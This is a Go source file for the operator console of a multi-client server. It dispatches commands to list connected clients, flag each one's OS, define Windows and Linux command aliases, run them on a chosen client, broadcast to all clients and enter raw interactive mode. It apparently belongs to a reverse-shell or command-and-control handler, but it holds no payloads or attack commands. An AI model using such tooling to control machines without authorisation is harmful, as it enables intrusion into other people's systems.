package main

import (
	"fmt"
	"sort"
	"strconv"
	"strings"
)

// CmdHandler processes a console command. Returns false to signal exit.
type CmdHandler func(s *Server, args []string) bool

// commands is the dispatch table for all console commands.
var commands = map[string]CmdHandler{
	"exit":     cmdExit,
	"quit":     cmdExit,
	"help":     cmdHelp,
	"?":        cmdHelp,
	"list":     cmdList,
	"ls":       cmdList,
	"kick":     cmdKick,
	"interact": cmdInteract,
	"i":        cmdInteract,
	"os":       cmdOS,
	"alias":    cmdAlias,
	"run":      cmdRun,
	"all":      cmdAll,
}

// Dispatch parses a line and routes it to the appropriate handler.
// Returns false if the server should exit.
func (s *Server) Dispatch(line string) bool {
	line = strings.TrimSpace(line)
	if line == "" {
		return true
	}

	parts := strings.Fields(line)
	handler, ok := commands[parts[0]]
	if ok {
		return handler(s, parts)
	}

	// Fallback: <id> <message>
	split2 := strings.SplitN(line, " ", 2)
	if len(split2) == 2 {
		cid, err := strconv.Atoi(split2[0])
		if err == nil {
			if err := s.SendTo(cid, split2[1]); err != nil {
				fmt.Printf("[!] %v\n", err)
			}
			return true
		}
	}

	fmt.Println("[!] usage: <id> <message>   (try 'list')")
	return true
}

func cmdExit(s *Server, args []string) bool {
	return false
}

func cmdHelp(s *Server, args []string) bool {
	fmt.Print(helpText)
	return true
}

func cmdList(s *Server, args []string) bool {
	clients := s.ListClients()
	if len(clients) == 0 {
		fmt.Println("    (no clients)")
		return true
	}
	for _, c := range clients {
		osFlag := "?"
		if c.OS != "" {
			osFlag = c.OS
		}
		fmt.Printf("    %d: %s  [%s]\n", c.ID, c.Addr, osFlag)
	}
	return true
}

func cmdKick(s *Server, args []string) bool {
	if len(args) < 2 {
		fmt.Println("[!] usage: kick <id>")
		return true
	}
	cid, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Println("[!] usage: kick <id>")
		return true
	}
	client := s.GetClient(cid)
	if client == nil {
		fmt.Printf("[!] no client with id %d\n", cid)
		return true
	}
	client.Conn.Close()
	return true
}

func cmdInteract(s *Server, args []string) bool {
	if len(args) < 2 {
		fmt.Println("[!] usage: interact <id>")
		return true
	}
	cid, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Println("[!] usage: interact <id>")
		return true
	}
	client := s.GetClient(cid)
	if client == nil {
		fmt.Printf("[!] no client with id %d\n", cid)
		return true
	}
	s.SetInteractCID(int32(cid))
	fmt.Printf("[*] interactive with client %d. '~.' or Ctrl-C to exit.\n", cid)
	return true
}

func cmdOS(s *Server, args []string) bool {
	if len(args) == 1 {
		// List all OS flags
		clients := s.ListClients()
		flagged := false
		for _, c := range clients {
			if c.OS != "" {
				fmt.Printf("    %d: %s\n", c.ID, c.OS)
				flagged = true
			}
		}
		if !flagged {
			fmt.Println("    (no OS flags set)")
		}
		return true
	}
	if len(args) == 3 && (args[2] == "windows" || args[2] == "linux") {
		cid, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println("[!] usage: os <id> <windows|linux>")
			return true
		}
		client := s.GetClient(cid)
		if client == nil {
			fmt.Printf("[!] no client with id %d\n", cid)
			return true
		}
		s.mu.Lock()
		if c, ok := s.clients[cid]; ok {
			c.OS = args[2]
		}
		s.mu.Unlock()
		fmt.Printf("[*] client %d flagged %s\n", cid, args[2])
		return true
	}
	fmt.Println("[!] usage: os <id> <windows|linux>")
	return true
}

func cmdAlias(s *Server, args []string) bool {
	if len(args) == 1 {
		// List aliases
		s.mu.RLock()
		names := make([]string, 0, len(s.aliases))
		for name := range s.aliases {
			names = append(names, name)
		}
		s.mu.RUnlock()

		if len(names) == 0 {
			fmt.Println("    (no aliases)")
			return true
		}
		sort.Strings(names)
		s.mu.RLock()
		for _, name := range names {
			a := s.aliases[name]
			fmt.Printf("    %s:\n", name)
			win := a.Windows
			if win == "" {
				win = "-"
			}
			lin := a.Linux
			if lin == "" {
				lin = "-"
			}
			fmt.Printf("        windows: %s\n", win)
			fmt.Printf("        linux:   %s\n", lin)
		}
		s.mu.RUnlock()
		return true
	}
	if args[1] == "add" {
		// alias add <name> <win-cmd> ::: <lin-cmd>
		// Need to re-parse from the original joined form
		body := strings.SplitN(strings.Join(args, " "), " ", 4)
		if len(body) < 4 || !strings.Contains(body[3], ":::") {
			fmt.Println("[!] usage: alias add <name> <win-cmd> ::: <lin-cmd>")
			return true
		}
		name := body[2]
		parts := strings.SplitN(body[3], ":::", 2)
		winCmd := strings.TrimSpace(parts[0])
		linCmd := strings.TrimSpace(parts[1])
		if winCmd == "" || linCmd == "" {
			fmt.Println("[!] usage: alias add <name> <win-cmd> ::: <lin-cmd>")
			return true
		}
		s.mu.Lock()
		s.aliases[name] = &Alias{Windows: winCmd, Linux: linCmd}
		s.mu.Unlock()
		fmt.Printf("[*] alias '%s' set  (windows: %s | linux: %s)\n", name, winCmd, linCmd)
		return true
	}
	if args[1] == "del" {
		if len(args) != 3 {
			fmt.Println("[!] usage: alias del <name>")
			return true
		}
		s.mu.Lock()
		_, exists := s.aliases[args[2]]
		if exists {
			delete(s.aliases, args[2])
		}
		s.mu.Unlock()
		if !exists {
			fmt.Println("[!] usage: alias del <name>")
			return true
		}
		fmt.Printf("[*] alias '%s' removed\n", args[2])
		return true
	}
	fmt.Println("[!] usage: alias | alias add <name> <win> ::: <lin> | alias del <name>")
	return true
}

func cmdRun(s *Server, args []string) bool {
	if len(args) < 3 {
		fmt.Println("[!] usage: run <id> <alias> [arg0] [arg1] ...")
		return true
	}
	cid, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Println("[!] usage: run <id> <alias> [arg0] [arg1] ...")
		return true
	}
	aliasName := args[2]
	aliasArgs := args[3:]

	s.mu.RLock()
	alias, exists := s.aliases[aliasName]
	s.mu.RUnlock()

	if !exists {
		fmt.Printf("[!] no alias '%s' (try 'alias')\n", aliasName)
		return true
	}

	client := s.GetClient(cid)
	if client == nil {
		fmt.Printf("[!] no client with id %d\n", cid)
		return true
	}

	if client.OS == "" {
		fmt.Printf("[!] client %d has no OS flag; use 'os %d windows|linux'\n", cid, cid)
		return true
	}

	var cmd string
	if client.OS == "windows" {
		cmd = alias.Windows
	} else {
		cmd = alias.Linux
	}

	if cmd == "" {
		fmt.Printf("[!] alias '%s' has no %s command\n", aliasName, client.OS)
		return true
	}

	resolved, err := substituteArgs(cmd, aliasArgs)
	if err != nil {
		needed := countFields(cmd)
		fmt.Printf("[!] alias '%s' needs %d arg(s):  run %d %s <arg0> [arg1 ...]\n", aliasName, needed, cid, aliasName)
		return true
	}

	fmt.Printf("[*] alias '%s' -> client %d (%s): %s\n", aliasName, cid, client.OS, resolved)
	if err := s.SendTo(cid, resolved); err != nil {
		fmt.Printf("[!] %v\n", err)
	}
	return true
}

func cmdAll(s *Server, args []string) bool {
	if len(args) < 2 {
		fmt.Println("[!] usage: all <message>")
		return true
	}
	// Reconstruct the message: everything after "all "
	msg := strings.Join(args[1:], " ")
	clients := s.ListClients()
	for _, c := range clients {
		if err := s.SendTo(c.ID, msg); err != nil {
			fmt.Printf("[!] %v\n", err)
		}
	}
	return true
}

const helpText = `  list / ls                         show connected clients
  <id> <message>                    send message to client
  all <message>                     broadcast to all clients
  kick <id>                         disconnect client
  interact <id> / i <id>            raw passthrough mode (Ctrl-C or ~. to exit)
  os                                list OS flags
  os <id> <windows|linux>           set client OS flag
  alias                             list aliases
  alias add <name> <win> ::: <lin>  define alias
  alias del <name>                  remove alias
  run <id> <name> [arg0] [arg1] ... run alias on client ({0}/{1} substituted)
  exit / quit                       shut down server
`
